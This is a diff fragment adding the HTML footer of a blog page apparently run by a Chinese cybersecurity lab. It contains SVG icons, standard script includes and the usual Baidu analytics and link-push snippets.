+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
